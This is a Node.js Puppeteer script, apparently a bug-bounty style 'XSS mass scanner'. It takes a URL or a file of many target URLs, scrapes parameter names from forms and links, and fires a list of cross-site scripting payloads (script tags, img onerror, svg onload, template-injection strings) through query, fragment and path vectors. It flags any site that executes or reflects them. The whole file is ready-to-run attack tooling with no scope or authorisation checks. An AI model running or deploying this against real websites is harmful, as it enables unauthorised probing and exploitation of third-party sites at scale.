// Built for puppeteer-core to use your local Ubuntu Chromium environment
const puppeteer = require('puppeteer-core');
const fs = require('fs');
const path = require('path');

// Strategic payload group targeting classic tags, structural breakouts, and SPA frameworks
const payloads = [
    'javascript:alert(1)',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"`><script>alert(1)</script>',
    '${alert(1)}',
    '{{constructor.constructor(\'alert(1)\')()}}'
];

// CLI Argument Parsing
const args = process.argv.slice(2);
if (args.length === 0) {
    console.log("❌ Error: Missing targets.");
    console.log("💡 Usage (Single URL) : node xss_mass_scanner.js https://example.com");
    console.log("💡 Usage (Mass File) : node xss_mass_scanner.js targets.txt");
    process.exit(1);
}

const inputTarget = args[0];
let targetList = [];

// Parse target input source (File vs Single URL)
if (fs.existsSync(inputTarget)) {
    console.log(`[📦] Target file detected. Reading scopes from: ${inputTarget}`);
    targetList = fs.readFileSync(inputTarget, 'utf-8')
        .split('\n')
        .map(line => line.trim())
        .filter(line => line.startsWith('http://') || line.startsWith('https://'));
} else if (inputTarget.startsWith('http://') || inputTarget.startsWith('https://')) {
    targetList.push(inputTarget);
} else {
    console.log("❌ Error: Input must be a valid HTTP/HTTPS URL or an existing text file.");
    process.exit(1);
}

async function runMassScanner() {
    console.log(`[+] Initializing Chromium Browser via Puppeteer...`);
    const browser = await puppeteer.launch({ 
        executablePath: '/usr/bin/chromium-browser',
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });

    console.log(`[🚀] Starting Scan Campaign against ${targetList.length} scope targets.`);

    for (let baseUrl of targetList) {
        console.log(`\n==================================================================`);
        console.log(`🎯 CURRENT SCOPE TARGET: ${baseUrl}`);
        console.log(`==================================================================`);

        const page = await browser.newPage();
        const discoveredParams = new Set(['search', 'q', 'id']); // Default fallbacks

        // ==========================================================
        // PHASE 1: AUTOMATIC PARAMETER DISCOVERY
        // ==========================================================
        console.log(`[🔍 Phase 1]: Discovering input parameters...`);
        try {
            await page.goto(baseUrl, { waitUntil: 'networkidle2', timeout: 12000 });
            
            const extractedParams = await page.evaluate(() => {
                const keys = [];
                // 1. Scrape all input-capable tags
                document.querySelectorAll('input, textarea, select, form').forEach(el => {
                    if (el.name) keys.push(el.name);
                    else if (el.id) keys.push(el.id);
                });
                // 2. Scrape internal anchor link patterns
                document.querySelectorAll('a').forEach(el => {
                    const href = el.getAttribute('href');
                    if (href && href.includes('?')) {
                        const urlParams = new URLSearchParams(href.split('?'));
                        for (const key of urlParams.keys()) {
                            keys.push(key);
                        }
                    }
                });
                return keys;
            });

            extractedParams.forEach(param => discoveredParams.add(param));
            console.log(`[+] Discovery complete. Live parameters tracked: [ ${Array.from(discoveredParams).join(', ')} ]`);

        } catch (err) {
            console.log(`[-] Discovery process failed or timed out. Falling back to defaults.`);
        } finally {
            await page.close();
        }

        // ==========================================================
        // PHASE 2: ADVANCED SYSTEM FUZZING
        // ==========================================================
        console.log(`[🚀 Phase 2]: Launching Attack Matrix Execution...`);

        for (let payload of payloads) {
            const testUrls = [];

            // Vector A: Query Array Generation
            discoveredParams.forEach(param => {
                testUrls.push({
                    url: baseUrl.includes('?') ? `${baseUrl}&${param}=${encodeURIComponent(payload)}` : `${baseUrl}?${param}=${encodeURIComponent(payload)}`,
                    type: `QUERY (${param})`
                });
            });

            // Vector B: Hash/Fragment Injections
            testUrls.push({
                url: `${baseUrl.replace(/\/$/, '')}#${encodeURIComponent(payload)}`,
                type: 'HASH (#)'
            });

            // Vector C: Path-Based Client-Side Routing Fuzzing
            testUrls.push({
                url: `${baseUrl.replace(/\/$/, '')}/${encodeURIComponent(payload)}`,
                type: 'PATH-ROUTER'
            });

            for (let target of testUrls) {
                const attackPage = await browser.newPage();
                let xssDetected = false;

                // 1. Dialog Listener: Ultimate confirmation of execution
                attackPage.on('dialog', async dialog => {
                    if (dialog.message() || dialog.type() === 'alert') {
                        console.log(`\n🚨🚨🚨 [XSS DETECTED!] 🚨🚨🚨`);
                        console.log(`[🎯 Base Scope]        : ${baseUrl}`);
                        console.log(`[🎯 Vector Type]      : ${target.type}`);
                        console.log(`[🎯 Triggering URL]   : ${target.url}`);
                        console.log(`[💬 Dialog Message]   : "${dialog.message()}"\n`);
                        xssDetected = true;
                        await dialog.dismiss();
                    }
                });

                // 2. Console Monitor: Tracks engine blockages
                attackPage.on('console', msg => {
                    if (msg.type() === 'error' && msg.text().toLowerCase().includes('alert')) {
                        console.log(`   [⚠️ Console Alert]: Context blocked: ${msg.text()}`);
                    }
                });

                // 3. Exception Monitor: Catches runtime syntax breakages
                attackPage.on('pageerror', error => {
                    if (error.message.includes('alert') || error.message.includes('Unexpected token')) {
                        console.log(`   [💥 JS Exception]: Payload context broke runtime logic -> ${error.message}`);
                    }
                });

                // 4. API Response Interceptor: Analyzes Fetch/AJAX streams
                attackPage.on('response', async response => {
                    try {
                        const contentType = response.headers()['content-type'] || '';
                        if (contentType.includes('application/json') || contentType.includes('text/plain') || contentType.includes('text/html')) {
                            const responseBody = await response.text();
                            if (responseBody.includes(payload)) {
                                console.log(`   [🚨 API Data Reflection]: Payload tracked through server stream!`);
                                console.log(`      └─ Target API Endpoint: ${response.url()}`);
                            }
                        }
                    } catch (err) {
                        // Fail-safe handling for aborted requests
                    }
                });

                try {
                    console.log(`[*] Testing Vector [${target.type}]: ${target.url}`);
                    await attackPage.goto(target.url, { waitUntil: 'networkidle2', timeout: 10000 });
                    
                    // Allow frameworks time to process inputs into sinks
                    await new Promise(resolve => setTimeout(resolve, 1500));

                    // 5. Passive DOM Analyzer: Checks for reflection in raw HTML code tree
                    if (!xssDetected) {
                        const pageContent = await attackPage.content();
                        if (pageContent.includes(payload)) {
                            console.log(`   └─ [🔍 DOM Reflection]: Payload rendered natively inside HTML code.`);
                        }
                    }

                } catch (error) {
                    console.log(`[-] Execution timeout on target vector invocation.`);
                } finally {
                    await attackPage.close();
                }
            }
        }
    }

    console.log(`\n[+] Dynamic Master Scan Campaign Finished.`);
    await browser.close();
}

runMassScanner();
